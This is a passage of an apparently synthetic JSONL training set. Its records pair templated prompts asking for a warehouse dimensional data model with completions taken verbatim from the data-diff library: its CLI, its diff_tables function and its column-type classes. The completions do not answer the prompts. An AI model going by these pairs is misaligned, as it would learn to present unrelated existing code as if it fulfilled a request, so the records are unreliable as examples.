relevant when threaded is True.\n    # There may be many pools, so number of actual threads can be a lot higher.\n    max_threadpool_size: Optional[int] = 1,\n    # Algorithm\n    algorithm: Algorithm = Algorithm.AUTO,\n    # An additional 'where' expression to restrict the search space.\n    where: str = None,\n    # Into how many segments to bisect per iteration (hashdiff only)\n    bisection_factor: int = DEFAULT_BISECTION_FACTOR,\n    # When should we stop bisecting and compare locally (in row count; hashdiff only)\n    bisection_threshold: int = DEFAULT_BISECTION_THRESHOLD,\n    # Enable/disable validating that the key columns are unique. (joindiff only)\n    validate_unique_key: bool = True,\n    # Enable/disable sampling of exclusive rows. Creates a temporary table. (joindiff only)\n    sample_exclusive_rows: bool = False,\n    # Path of new table to write diff results to. Disabled if not provided. (joindiff only)\n    materialize_to_table: Union[str, DbPath] = None,\n    # Materialize every row, not just those that are different. (joindiff only)\n    materialize_all_rows: bool = False,\n    # Maximum number of rows to write when materializing, per thread. (joindiff only)\n    table_write_limit: int = TABLE_WRITE_LIMIT,\n    # Skips diffing any rows with null keys. (joindiff only)\n    skip_null_keys: bool = False,\n) -> Iterator:\n    \"\"\"Finds the diff between table1 and table2.\n\n    Parameters:\n        key_columns (Tuple[str, ...]): Name of the key column, which uniquely identifies each row (usually id)\n        update_column (str, optional): Name of updated column, which signals that rows changed.\n                                       Usually updated_at or last_update.  Used by `min_update` and `max_update`.\n        extra_columns (Tuple[str, ...], optional): Extra columns to compare\n        min_key (:data:`Vector`, optional): Lowest key value, used to restrict the segment\n        max_key (:data:`Vector`, optional): Highest key value, used to restrict the segment\n        min_update (:data:`DbTime`, optional): Lowest update_column value, used to restrict the segment\n        max_update (:data:`DbTime`, optional): Highest update_column value, used to restrict the segment\n        threaded (bool): Enable/disable threaded diffing. Needed to take advantage of database threads.\n        max_threadpool_size (int): Maximum size of each threadpool. ``None`` means auto.\n                                   Only relevant when `threaded` is ``True``.\n                                   There may be many pools, so number of actual threads can be a lot higher.\n        where (str, optional): An additional 'where' expression to restrict the search space.\n        algorithm (:class:`Algorithm`): Which diffing algorithm to use (`HASHDIFF` or `JOINDIFF`. Default=`AUTO`)\n        bisection_factor (int): Into how many segments to bisect per iteration. (Used when algorithm is `HASHDIFF`)\n        bisection_threshold (Number): Minimal row count of segment to bisect, otherwise download\n                                      and compare locally. (Used when algorithm is `HASHDIFF`).\n        validate_unique_key (bool): Enable/disable validating that the key columns are unique. (used for `JOINDIFF`. default: True)\n                                    Single query, and can't be threaded, so it's very slow on non-cloud dbs.\n                                    Future versions will detect UNIQUE constraints in the schema.\n        sample_exclusive_rows (bool): Enable/disable sampling of exclusive rows. Creates a temporary table. (used for `JOINDIFF`. default: False)\n        materialize_to_table (Union[str, DbPath], optional): Path of new table to write diff results to. Disabled if not provided. Used for `JOINDIFF`.\n        materialize_all_rows (bool): Materialize every row, not just those that are different. (used for `JOINDIFF`. default: False)\n        table_write_limit (int): Maximum number of rows to write when materializing, per thread.\n        skip_null_keys (bool): Skips diffing any rows with null PKs (displays a warning if any are null) (used for `JOINDIFF`. default: False)\n\n    Note:\n        The following parameters are used to override the corresponding attributes of the given :class:`TableSegment` instances:\n        `key_columns`, `update_column`, `extra_columns`, `min_key`, `max_key`, `where`.\n        If different values are needed per table, it's possible to omit them here, and instead set\n        them directly when creating each :class:`TableSegment`.\n\n    Example:\n        >>> table1 = connect_to_table('postgresql:///', 'Rating', 'id')\n        >>> list(diff_tables(table1, table1))\n        []\n\n    See Also:\n        :class:`TableSegment`\n        :class:`HashDiffer`\n        :class:`JoinDiffer`\n\n    \"\"\"\n    if isinstance(key_columns, str):\n        key_columns = (key_columns,)\n\n    tables = [table1, table2]\n    override_attrs = {\n        k: v\n        for k, v in dict(\n            key_columns=key_columns,\n            update_column=update_column,\n            extra_columns=extra_columns,\n            min_key=min_key,\n            max_key=max_key,\n            min_update=min_update,\n            max_update=max_update,\n            where=where,\n        ).items()\n        if v is not None\n    }\n\n    segments = [t.new(**override_attrs) for t in tables] if override_attrs else tables\n\n    algorithm = Algorithm(algorithm)\n    if algorithm == Algorithm.AUTO:\n        algorithm = Algorithm.JOINDIFF if table1.database is table2.database else Algorithm.HASHDIFF\n\n    if algorithm == Algorithm.HASHDIFF:\n        differ = HashDiffer(\n            bisection_factor=bisection_factor,\n            bisection_threshold=bisection_threshold,\n            threaded=threaded,\n            max_threadpool_size=max_threadpool_size,\n        )\n    elif algorithm == Algorithm.JOINDIFF:\n        if isinstance(materialize_to_table, str):\n            table_name = eval_name_template(materialize_to_table)\n            materialize_to_table = table1.database.dialect.parse_table_name(table_name)\n        differ = JoinDiffer(\n            threaded=threaded,\n            max_threadpool_size=max_threadpool_size,\n            validate_unique_key=validate_unique_key,\n            sample_exclusive_rows=sample_exclusive_rows,\n            materialize_to_table=materialize_to_table,\n            materialize_all_rows=materialize_all_rows,\n            table_write_limit=table_write_limit,\n            skip_null_keys=skip_null_keys,\n        )\n    else:\n        raise ValueError(f\"Unknown algorithm: {algorithm}\")\n\n    return differ.diff_tables(*segments)\n", "metadata": {"source": "github.com/datafold/data-diff", "file_path": "data_diff/__init__.py", "language": "python", "complexity": "medium", "star_count": 2981, "quality_score": 0.72, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import json\nimport logging\nimport os\nimport sys\nimport time\nfrom copy import deepcopy\nfrom datetime import datetime\nfrom itertools import islice\nfrom typing import Dict, Optional, Tuple, Union, List, Set\n\nimport click\nimport rich\nfrom rich.logging import RichHandler\n\nfrom data_diff import Database, DbPath\nfrom data_diff.config import apply_config_from_file\nfrom data_diff.databases._connect import connect\nfrom data_diff.dbt import dbt_diff\nfrom data_diff.diff_tables import Algorithm, TableDiffer\nfrom data_diff.hashdiff_tables import HashDiffer, DEFAULT_BISECTION_THRESHOLD, DEFAULT_BISECTION_FACTOR\nfrom data_diff.joindiff_tables import TABLE_WRITE_LIMIT, JoinDiffer\nfrom data_diff.parse_time import parse_time_before, UNITS_STR, ParseError\nfrom data_diff.queries.api import current_timestamp\nfrom data_diff.schema import RawColumnInfo, create_schema\nfrom data_diff.table_segment import TableSegment\nfrom data_diff.tracking import disable_tracking, set_entrypoint_name\nfrom data_diff.utils import eval_name_template, remove_password_from_url, safezip, match_like, LogStatusHandler\nfrom data_diff.version import __version__\n\nCOLOR_SCHEME = {\n    \"+\": \"green\",\n    \"-\": \"red\",\n}\n\nset_entrypoint_name(os.getenv(\"DATAFOLD_TRIGGERED_BY\", \"CLI\"))\n\n\ndef _get_log_handlers(is_dbt: Optional[bool] = False) -> Dict[str, logging.Handler]:\n    handlers = {}\n    date_format = \"%H:%M:%S\"\n    log_format_rich = \"%(message)s\"\n\n    # limits to 100 characters arbitrarily\n    log_format_status = \"%(message).100s\"\n    rich_handler = RichHandler(rich_tracebacks=True)\n    rich_handler.setFormatter(logging.Formatter(log_format_rich, datefmt=date_format))\n    rich_handler.setLevel(logging.WARN)\n    handlers[\"rich_handler\"] = rich_handler\n\n    # only use log_status_handler in an interactive terminal session\n    if rich_handler.console.is_interactive and is_dbt:\n        log_status_handler = LogStatusHandler()\n        log_status_handler.setFormatter(logging.Formatter(log_format_status, datefmt=date_format))\n        log_status_handler.setLevel(logging.DEBUG)\n        handlers[\"log_status_handler\"] = log_status_handler\n\n    return handlers\n\n\ndef _remove_passwords_in_dict(d: dict) -> None:\n    for k, v in d.items():\n        if k == \"password\":\n            d[k] = \"*\" * len(v)\n        elif k == \"filepath\":\n            if \"motherduck_token=\" in v:\n                d[k] = v.split(\"motherduck_token=\")[0] + \"motherduck_token=**********\"\n        elif isinstance(v, dict):\n            _remove_passwords_in_dict(v)\n        elif k.startswith(\"database\"):\n            d[k] = remove_password_from_url(v)\n\n\ndef _get_schema(pair: Tuple[Database, DbPath]) -> Dict[str, RawColumnInfo]:\n    db, table_path = pair\n    return db.query_table_schema(table_path)\n\n\ndef diff_schemas(table1, table2, schema1, schema2, columns) -> None:\n    logging.info(\"Diffing schemas...\")\n    attrs = \"name\", \"type\", \"datetime_precision\", \"numeric_precision\", \"numeric_scale\"\n    for c in columns:\n        if c is None:  # Skip for convenience\n            continue\n        diffs = []\n\n        if c not in schema1:\n            cols = \", \".join(schema1)\n            raise ValueError(f\"Column '{c}' not found in table 1, named '{table1}'. Columns: {cols}\")\n        if c not in schema2:\n            cols = \", \".join(schema1)\n            raise ValueError(f\"Column '{c}' not found in table 2, named '{table2}'. Columns: {cols}\")\n\n        col1 = schema1[c]\n        col2 = schema2[c]\n\n        for attr, v1, v2 in safezip(attrs, col1, col2):\n            if v1 != v2:\n                diffs.append(f\"{attr}:({v1} != {v2})\")\n        if diffs:\n            logging.warning(f\"Schema mismatch in column '{c}': {', '.join(diffs)}\")\n\n\nclass MyHelpFormatter(click.HelpFormatter):\n    def __init__(self, **kwargs) -> None:\n        super().__init__(self, **kwargs)\n        self.indent_increment = 6\n\n    def write_usage(self, prog: str, args: str = \"\", prefix: Optional[str] = None) -> None:\n        self.write(f\"data-diff v{__version__} - efficiently diff rows across database tables.\\n\\n\")\n        self.write(\"Usage:\\n\")\n        self.write(f\"  * In-db diff:    {prog} <database_a> <table_a> <table_b> [OPTIONS]\\n\")\n        self.write(f\"  * Cross-db diff: {prog} <database_a> <table_a> <database_b> <table_b> [OPTIONS]\\n\")\n        self.write(f\"  * Using config:  {prog} --conf PATH [--run NAME] [OPTIONS]\\n\")\n\n\nclick.Context.formatter_class = MyHelpFormatter\n\n\n@click.command(no_args_is_help=True)\n@click.argument(\"database1\", required=False)\n@click.argument(\"table1\", required=False)\n@click.argument(\"database2\", required=False)\n@click.argument(\"table2\", required=False)\n@click.option(\n    \"-k\", \"--key-columns\", default=[], multiple=True, help=\"Names of primary key columns. Default='id'.\", metavar=\"NAME\"\n)\n@click.option(\"-t\", \"--update-column\", default=None, help=\"Name of updated_at/last_updated column\", metavar=\"NAME\")\n@click.option(\n    \"-c\",\n    \"--columns\",\n    default=[],\n    multiple=True,\n    help=\"Names of extra columns to compare.\"\n    \"Can be used more than once in the same command. \"\n    \"Accepts a name or a pattern like in SQL. Example: -c col% -c another_col\",\n    metavar=\"NAME\",\n)\n@click.option(\"-l\", \"--limit\", default=None, help=\"Maximum number of differences to find\", metavar=\"NUM\")\n@click.option(\n    \"--bisection-factor\",\n    default=None,\n    help=f\"Segments per iteration. Default={DEFAULT_BISECTION_FACTOR}.\",\n    metavar=\"NUM\",\n)\n@click.option(\n    \"--bisection-threshold\",\n    default=None,\n    help=f\"Minimal bisection threshold. Below it, data-diff will download the data and compare it locally. Default={DEFAULT_BISECTION_THRESHOLD}.\",\n    metavar=\"NUM\",\n)\n@click.option(\n    \"-m\",\n    \"--materialize-to-table\",\n    default=None,\n    metavar=\"TABLE_NAME\",\n    help=\"(joindiff only) Materialize the diff results into a new table in the database. If a table exists by that name, it will be replaced.\",\n)\n@click.option(\n    \"--min-age\",\n    default=None,\n    help=\"Considers only rows older than specified. Useful for specifying replication lag.\"\n    \"Example: --min-age=5min ignores rows from the last 5 minutes. \"\n    f\"\\nValid units: {UNITS_STR}\",\n    metavar=\"AGE\",\n)\n@click.option(\n    \"--max-age\", default=None, help=\"Considers only rows younger than specified. See --min-age.\", metavar=\"AGE\"\n)\n@click.option(\"-s\", \"--stats\", is_flag=True, help=\"Print stats instead of a detailed diff\")\n@click.option(\"-d\", \"--debug\", is_flag=True, help=\"Print debug info\")\n@click.option(\"--json\", \"json_output\", is_flag=True, help=\"Print JSONL output for machine readability\")\n@click.option(\"-v\", \"--verbose\", is_flag=True, help=\"Print extra info\")\n@click.option(\"--version\", is_flag=True, help=\"Print version info and exit\")\n@click.option(\"-i\", \"--interactive\", is_flag=True, help=\"Confirm queries, implies --debug\")\n@click.option(\"--no-tracking\", is_flag=True, help=\"data-diff sends home anonymous usage data. Use this to disable it.\")\n@click.option(\n    \"--case-sensitive\",\n    is_flag=True,\n    help=\"Column names are treated as case-sensitive. Otherwise, data-diff corrects their case according to schema.\",\n)\n@click.option(\n    \"--assume-unique-key\",\n    is_flag=True,\n    help=\"Skip validating the uniqueness of the key column during joindiff, which is costly in non-cloud dbs.\",\n)\n@click.option(\n    \"--sample-exclusive-rows\",\n    is_flag=True,\n    help=\"Sample several rows that only appear in one of the tables, but not the other. (joindiff only)\",\n)\n@click.option(\n    \"--materialize-all-rows\",\n    is_flag=True,\n    help=\"Materialize every row, even if they are the same, instead of just the differing rows. (joindiff only)\",\n)\n@click.option(\n    \"--table-write-limit\",\n    default=TABLE_WRITE_LIMIT,\n    help=f\"Maximum number of rows to write when creating materialized or sample tables, per thread. Default={TABLE_WRITE_LIMIT}\",\n    metavar=\"COUNT\",\n)\n@click.option(\n    \"-j\",\n    \"--threads\",\n    default=None,\n    help=\"Number of worker threads to use per database. Default=1. \"\n    \"A higher number will increase performance, but take more capacity from your database. \"\n    \"'serial' guarantees a single-threaded execution of the algorithm (useful for debugging).\",\n    metavar=\"COUNT\",\n)\n@click.option(\n    \"-w\",\n    \"--where\",\n    default=None,\n    help=\"An additional 'where' expression to restrict the search space. Beware of SQL Injection!\",\n    metavar=\"EXPR\",\n)\n@click.option(\"-a\", \"--algorithm\", default=Algorithm.AUTO.value, type=click.Choice([i.value for i in Algorithm]))\n@click.option(\n    \"--conf\",\n    default=None,\n    help=\"Path to a configuration.toml file, to provide a default configuration, and a list of possible runs.\",\n    metavar=\"PATH\",\n)\n@click.option(\n    \"--run\",\n    default=None,\n    help=\"Name of run-configuration to run. If used, CLI arguments for database and table must be omitted.\",\n    metavar=\"NAME\",\n)\n@click.option(\n    \"--dbt\",\n    is_flag=True,\n    help=\"Run a diff using your local dbt project. Expects to be run from a dbt project folder by default.\",\n)\n@click.option(\n    \"--cloud\",\n    is_flag=True,\n    help=\"Add this flag along with --dbt to run a diff using your local dbt project on Datafold cloud. Expects an api key on env var DATAFOLD_API_KEY.\",\n)\n@click.option(\n    \"--dbt-profiles-dir\",\n    envvar=\"DBT_PROFILES_DIR\",\n    default=None,\n    metavar=\"PATH\",\n    help=\"Which directory to look in for the profiles.yml file. If not set, we follow the default profiles.yml location for the dbt version being used. Can also be set via the DBT_PROFILES_DIR environment variable.\",\n)\n@click.option(\n    \"--dbt-project-dir\",\n    default=None,\n    metavar=\"PATH\",\n    help=\"Which directory to look in for the dbt_project.yml file. Default is the current working directory and its parents.\",\n)\n@click.option(\n    \"--select\",\n    \"-s\",\n    default=None,\n    metavar=\"SELECTION or MODEL_NAME\",\n    help=\"--select dbt resources to compare using dbt selection syntax in dbt versions >= 1.5.\\nIn versions < 1.5, it will naively search for a model with MODEL_NAME as the name.\",\n)\n@click.option(\n    \"--state\",\n    \"-s\",\n    default=None,\n    metavar=\"PATH\",\n    help=\"Specify manifest to utilize for 'prod' comparison paths instead of using configuration.\",\n)\n@click.option(\n    \"-pd\",\n    \"--prod-database\",\n    \"prod_database\",\n    default=None,\n    help=\"Override the dbt production database configuration within dbt_project.yml\",\n)\n@click.option(\n    \"-ps\",\n    \"--prod-schema\",\n    \"prod_schema\",\n    default=None,\n    help=\"Override the dbt production schema configuration within dbt_project.yml\",\n)\ndef main(conf, run, **kw) -> None:\n    log_handlers = _get_log_handlers(kw[\"dbt\"])\n    if kw[\"table2\"] is None and kw[\"database2\"]:\n        # Use the \"database table table\" form\n        kw[\"table2\"] = kw[\"database2\"]\n        kw[\"database2\"] = kw[\"database1\"]\n\n    if kw[\"version\"]:\n        print(f\"v{__version__}\")\n        return\n\n    if conf:\n        kw = apply_config_from_file(conf, run, kw)\n\n    if kw[\"no_tracking\"]:\n        disable_tracking()\n\n    if kw.get(\"interactive\"):\n        kw[\"debug\"] = True\n\n    if kw[\"debug\"]:\n        log_handlers[\"rich_handler\"].setLevel(logging.DEBUG)\n        logging.basicConfig(level=logging.DEBUG, handlers=list(log_handlers.values()))\n        if kw.get(\"__conf__\"):\n            kw[\"__conf__\"] = deepcopy(kw[\"__conf__\"])\n            _remove_passwords_in_dict(kw[\"__conf__\"])\n            logging.debug(f\"Applied run configuration: {kw['__conf__']}\")\n    elif kw.get(\"verbose\"):\n        log_handlers[\"rich_handler\"].setLevel(logging.INFO)\n        logging.basicConfig(level=logging.DEBUG, handlers=list(log_handlers.values()))\n    else:\n        log_handlers[\"rich_handler\"].setLevel(logging.WARNING)\n        logging.basicConfig(level=logging.DEBUG, handlers=list(log_handlers.values()))\n\n    try:\n        state = kw.pop(\"state\", None)\n        if state:\n            state = os.path.expanduser(state)\n        profiles_dir_override = kw.pop(\"dbt_profiles_dir\", None)\n        if profiles_dir_override:\n            profiles_dir_override = os.path.expanduser(profiles_dir_override)\n        project_dir_override = kw.pop(\"dbt_project_dir\", None)\n        if project_dir_override:\n            project_dir_override = os.path.expanduser(project_dir_override)\n        if kw[\"dbt\"]:\n            dbt_diff(\n                log_status_handler=log_handlers.get(\"log_status_handler\"),\n                profiles_dir_override=profiles_dir_override,\n                project_dir_override=project_dir_override,\n                is_cloud=kw[\"cloud\"],\n                dbt_selection=kw[\"select\"],\n                json_output=kw[\"json_output\"],\n                state=state,\n                where_flag=kw[\"where\"],\n                stats_flag=kw[\"stats\"],\n                columns_flag=kw[\"columns\"],\n                production_database_flag=kw[\"prod_database\"],\n                production_schema_flag=kw[\"prod_schema\"],\n            )\n        else:\n            _data_diff(dbt_project_dir=project_dir_override, dbt_profiles_dir=profiles_dir_override, state=state, **kw)\n    except Exception as e:\n        logging.error(e)\n        raise\n\n\ndef _get_dbs(\n    threads: int, database1: str, threads1: int, database2: str, threads2: int, interactive: bool\n) -> Tuple[Database, Database]:\n    db1 = connect(database1, threads1 or threads)\n    if database1 == database2:\n        db2 = db1\n    else:\n        db2 = connect(database2, threads2 or threads)\n\n    if interactive:\n        db1.enable_interactive()\n        db2.enable_interactive()\n\n    return db1, db2\n\n\ndef _set_age(options: dict, min_age: Optional[str], max_age: Optional[str], db: Database) -> None:\n    if min_age or max_age:\n        now: datetime = db.query(current_timestamp(), datetime).replace(tzinfo=None)\n        try:\n            if max_age:\n                options[\"min_update\"] = parse_time_before(now, max_age)\n            if min_age:\n                options[\"max_update\"] = parse_time_before(now, min_age)\n        except ParseError as e:\n            logging.error(f\"Error while parsing age expression: {e}\")\n\n\ndef _get_table_differ(\n    algorithm: str,\n    db1: Database,\n    db2: Database,\n    threaded: bool,\n    threads: int,\n    assume_unique_key: bool,\n    sample_exclusive_rows: bool,\n    materialize_all_rows: bool,\n    table_write_limit: int,\n    materialize_to_table: Optional[str],\n    bisection_factor: Optional[int],\n    bisection_threshold: Optional[int],\n) -> TableDiffer:\n    algorithm = Algorithm(algorithm)\n    if algorithm == Algorithm.AUTO:\n        algorithm = Algorithm.JOINDIFF if db1 == db2 else Algorithm.HASHDIFF\n\n    logging.info(f\"Using algorithm '{algorithm.name.lower()}'.\")\n\n    if algorithm == Algorithm.JOINDIFF:\n        return JoinDiffer(\n            threaded=threaded,\n            max_threadpool_size=threads and threads * 2,\n            validate_unique_key=not assume_unique_key,\n            sample_exclusive_rows=sample_exclusive_rows,\n            materialize_all_rows=materialize_all_rows,\n            table_write_limit=table_write_limit,\n            materialize_to_table=(\n                materialize_to_table and db1.dialect.parse_table_name(eval_name_template(materialize_to_table))\n            ),\n        )\n\n    assert algorithm == Algorithm.HASHDIFF\n    return HashDiffer(\n        bisection_factor=DEFAULT_BISECTION_FACTOR if bisection_factor is None else bisection_factor,\n        bisection_threshold=DEFAULT_BISECTION_THRESHOLD if bisection_threshold is None else bisection_threshold,\n        threaded=threaded,\n        max_threadpool_size=threads and threads * 2,\n    )\n\n\ndef _print_result(stats, json_output, diff_iter) -> None:\n    if stats:\n        if json_output:\n            rich.print(json.dumps(diff_iter.get_stats_dict()))\n        else:\n            rich.print(diff_iter.get_stats_string())\n\n    else:\n        for op, values in diff_iter:\n            color = COLOR_SCHEME.get(op, \"grey62\")\n\n            if json_output:\n                jsonl = json.dumps([op, list(values)])\n                rich.print(f\"[{color}]{jsonl}[/{color}]\")\n            else:\n                text = f\"{op} {', '.join(map(str, values))}\"\n                rich.print(f\"[{color}]{text}[/{color}]\")\n\n            sys.stdout.flush()\n\n\ndef _get_expanded_columns(\n    columns: List[str],\n    case_sensitive: bool,\n    mutual: Set[str],\n    db1: Database,\n    schema1: dict,\n    table1: str,\n    db2: Database,\n    schema2: dict,\n    table2: str,\n) -> Set[str]:\n    expanded_columns: Set[str] = set()\n    for c in columns:\n        cc = c if case_sensitive else c.lower()\n        match = set(match_like(cc, mutual))\n        if not match:\n            m1 = None if any(match_like(cc, schema1.keys())) else f\"{db1}/{table1}\"\n            m2 = None if any(match_like(cc, schema2.keys())) else f\"{db2}/{table2}\"\n            not_matched = \", \".join(m for m in [m1, m2] if m)\n            raise ValueError(f\"Column '{c}' not found in: {not_matched}\")\n\n        expanded_columns |= match\n    return expanded_columns\n\n\ndef _get_threads(threads: Union[int, str, None], threads1: Optional[int], threads2: Optional[int]) -> Tuple[bool, int]:\n    threaded = True\n    if threads is None:\n        threads = 1\n    elif isinstance(threads, str) and threads.lower() == \"serial\":\n        assert not (threads1 or threads2)\n        threaded = False\n        threads = 1\n    else:\n        try:\n            threads = int(threads)\n        except ValueError:\n            logging.error(\"Error: threads must be a number, or 'serial'.\")\n            raise\n\n        if threads < 1:\n            logging.error(\"Error: threads must be >= 1\")\n            raise ValueError(\"Error: threads must be >= 1\")\n\n    return threaded, threads\n\n\ndef _data_diff(\n    database1,\n    table1,\n    database2,\n    table2,\n    key_columns,\n    update_column,\n    columns,\n    limit,\n    algorithm,\n    bisection_factor,\n    bisection_threshold,\n    min_age,\n    max_age,\n    stats,\n    debug,\n    verbose,\n    version,\n    interactive,\n    no_tracking,\n    threads,\n    case_sensitive,\n    json_output,\n    where,\n    assume_unique_key,\n    sample_exclusive_rows,\n    materialize_all_rows,\n    table_write_limit,\n    materialize_to_table,\n    dbt,\n    cloud,\n    dbt_profiles_dir,\n    dbt_project_dir,\n    prod_database,\n    prod_schema,\n    select,\n    state,\n    threads1=None,\n    threads2=None,\n    __conf__=None,\n) -> None:\n    if limit and stats:\n        logging.error(\"Cannot specify a limit when using the -s/--stats switch\")\n        return\n\n    key_columns = key_columns or (\"id\",)\n    threaded, threads = _get_threads(threads, threads1, threads2)\n    start = time.monotonic()\n\n    if database1 is None or database2 is None:\n        logging.error(\n            f\"Error: Databases not specified. Got {database1} and {database2}. Use --help for more information.\"\n        )\n        return\n\n    db1: Database\n    db2: Database\n    db1, db2 = _get_dbs(threads, database1, threads1, database2, threads2, interactive)\n    with db1, db2:\n        options = {\n            \"case_sensitive\": case_sensitive,\n            \"where\": where,\n        }\n\n        _set_age(options, min_age, max_age, db1)\n        dbs: Tuple[Database, Database] = db1, db2\n\n        differ = _get_table_differ(\n            algorithm,\n            db1,\n            db2,\n            threaded,\n            threads,\n            assume_unique_key,\n            sample_exclusive_rows,\n            materialize_all_rows,\n            table_write_limit,\n            materialize_to_table,\n            bisection_factor,\n            bisection_threshold,\n        )\n\n        table_names = table1, table2\n        table_paths = [db.dialect.parse_table_name(t) for db, t in safezip(dbs, table_names)]\n\n        schemas = list(differ._thread_map(_get_schema, safezip(dbs, table_paths)))\n        schema1, schema2 = schemas = [\n            create_schema(db.name, table_path, schema, case_sensitive)\n            for db, table_path, schema in safezip(dbs, table_paths, schemas)\n        ]\n\n        mutual = schema1.keys() & schema2.keys()  # Case-aware, according to case_sensitive\n        logging.debug(f\"Available mutual columns: {mutual}\")\n\n        expanded_columns = _get_expanded_columns(\n            columns, case_sensitive, mutual, db1, schema1, table1, db2, schema2, table2\n        )\n        columns = tuple(expanded_columns - {*key_columns, update_column})\n\n        if db1 == db2:\n            diff_schemas(\n                table_names[0],\n                table_names[1],\n                schema1,\n                schema2,\n                (\n                    *key_columns,\n                    update_column,\n                    *columns,\n                ),\n            )\n\n        logging.info(f\"Diffing using columns: key={key_columns} update={update_column} extra={columns}.\")\n\n        segments = [\n            TableSegment(db, table_path, key_columns, update_column, columns, **options)._with_raw_schema(raw_schema)\n            for db, table_path, raw_schema in safezip(dbs, table_paths, schemas)\n        ]\n\n        diff_iter = differ.diff_tables(*segments)\n\n        if limit:\n            assert not stats\n            diff_iter = islice(diff_iter, int(limit))\n\n        _print_result(stats, json_output, diff_iter)\n\n    end = time.monotonic()\n    logging.info(f\"Duration: {end-start:.2f} seconds.\")\n\n\nif __name__ == \"__main__\":\n    main()\n", "metadata": {"source": "github.com/datafold/data-diff", "file_path": "data_diff/__main__.py", "language": "python", "complexity": "complex", "star_count": 2981, "quality_score": 0.84, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import decimal\nfrom abc import ABC, abstractmethod\nfrom typing import Collection, List, Optional, Tuple, Type, TypeVar, Union\nfrom datetime import datetime\n\nimport attrs\n\nfrom data_diff.utils import ArithAlphanumeric, ArithUUID, Unknown\n\n\nDbPath = Tuple[str, ...]\nDbKey = Union[int, str, bytes, ArithUUID, ArithAlphanumeric]\nDbTime = datetime\n\nN = TypeVar(\"N\")\n\n\n@attrs.frozen(kw_only=True, eq=False, order=False, unsafe_hash=True)\nclass Collation:\n    \"\"\"\n    A pre-parsed or pre-known record about db collation, per column.\n\n    The \"greater\" collation should be used as a target collation for textual PKs\n    on both sides of the diff — by coverting the \"lesser\" collation to self.\n\n    Snowflake easily absorbs the performance losses, so it has a boost to always\n    be greater than any other collation in non-Snowflake databases.\n    Other databases need to negotiate which side absorbs the performance impact.\n    \"\"\"\n\n    # A boost for special databases that are known to absorb the performance dmaage well.\n    absorbs_damage: bool = False\n\n    # Ordinal soring by ASCII/UTF8 (True), or alphabetic as per locale/country/etc (False).\n    ordinal: Optional[bool] = None\n\n    # Lowercase first (aAbBcC or abcABC). Otherwise, uppercase first (AaBbCc or ABCabc).\n    lower_first: Optional[bool] = None\n\n    # 2-letter lower-case locale and upper-case country codes, e.g. en_US. Ignored for ordinals.\n    language: Optional[str] = None\n    country: Optional[str] = None\n\n    # There are also space-, punctuation-, width-, kana-(in)sensitivity, so on.\n    # Ignore everything not related to xdb alignment. Only case- & accent-sensitivity are common.\n    case_sensitive: Optional[bool] = None\n    accent_sensitive: Optional[bool] = None\n\n    # Purely informational, for debugging:\n    _source: Union[None, str, Collection[str]] = None\n\n    def __eq__(self, other: object) -> bool:\n        if not isinstance(other, Collation):\n            return NotImplemented\n        if self.ordinal and other.ordinal:\n            # TODO: does it depend on language? what does Albanic_BIN mean in MS SQL?\n            return True\n        return (\n            self.language == other.language\n            and (self.country is None or other.country is None or self.country == other.country)\n            and self.case_sensitive == other.case_sensitive\n            and self.accent_sensitive == other.accent_sensitive\n            and self.lower_first == other.lower_first\n        )\n\n    def __ne__(self, other: object) -> bool:\n        if not isinstance(other, Collation):\n            return NotImplemented\n        return not self.__eq__(other)\n\n    def __gt__(self, other: object) -> bool:\n        if not isinstance(other, Collation):\n            return NotImplemented\n        if self == other:\n            return False\n        if self.absorbs_damage and not other.absorbs_damage:\n            return False\n        if other.absorbs_damage and not self.absorbs_damage:\n            return True  # this one is preferred if it cannot absorb damage as its counterpart can\n        if self.ordinal and not other.ordinal:\n            return True\n        if other.ordinal and not self.ordinal:\n            return False\n        # TODO: try to align the languages & countries?\n        return False\n\n    def __ge__(self, other: object) -> bool:\n        if not isinstance(other, Collation):\n            return NotImplemented\n        return self == other or self.__gt__(other)\n\n    def __lt__(self, other: object) -> bool:\n        if not isinstance(other, Collation):\n            return NotImplemented\n        return self != other and not self.__gt__(other)\n\n    def __le__(self, other: object) -> bool:\n        if not isinstance(other, Collation):\n            return NotImplemented\n        return self == other or not self.__gt__(other)\n\n\n@attrs.define(frozen=True, kw_only=True)\nclass ColType:\n    # Arbitrary metadata added and fetched at runtime.\n    _notes: List[N] = attrs.field(factory=list, init=False, hash=False, eq=False)\n\n    def add_note(self, note: N) -> None:\n        self._notes.append(note)\n\n    def get_note(self, cls: Type[N]) -> Optional[N]:\n        \"\"\"Get the latest added note of type ``cls`` or its descendants.\"\"\"\n        for note in reversed(self._notes):\n            if isinstance(note, cls):\n                return note\n        return None\n\n    @property\n    def supported(self) -> bool:\n        return True\n\n\n@attrs.define(frozen=True)\nclass PrecisionType(ColType):\n    precision: int\n    rounds: Union[bool, Unknown] = Unknown\n\n\n@attrs.define(frozen=True)\nclass Boolean(ColType):\n    precision = 0\n\n\n@attrs.define(frozen=True)\nclass TemporalType(PrecisionType):\n    pass\n\n\n@attrs.define(frozen=True)\nclass Timestamp(TemporalType):\n    pass\n\n\n@attrs.define(frozen=True)\nclass TimestampTZ(TemporalType):\n    pass\n\n\n@attrs.define(frozen=True)\nclass Datetime(TemporalType):\n    pass\n\n\n@attrs.define(frozen=True)\nclass Date(TemporalType):\n    pass\n\n\n@attrs.define(frozen=True)\nclass Time(TemporalType):\n    pass\n\n\n@attrs.define(frozen=True)\nclass NumericType(ColType):\n    # 'precision' signifies how many fractional digits (after the dot) we want to compare\n    precision: int\n\n\n@attrs.define(frozen=True)\nclass FractionalType(NumericType):\n    pass\n\n\n@attrs.define(frozen=True)\nclass Float(FractionalType):\n    python_type = float\n\n\n@attrs.define(frozen=True)\nclass IKey(ABC):\n    \"Interface for ColType, for using a column as a key in table.\"\n\n    @property\n    @abstractmethod\n    def python_type(self) -> type:\n        \"Return the equivalent 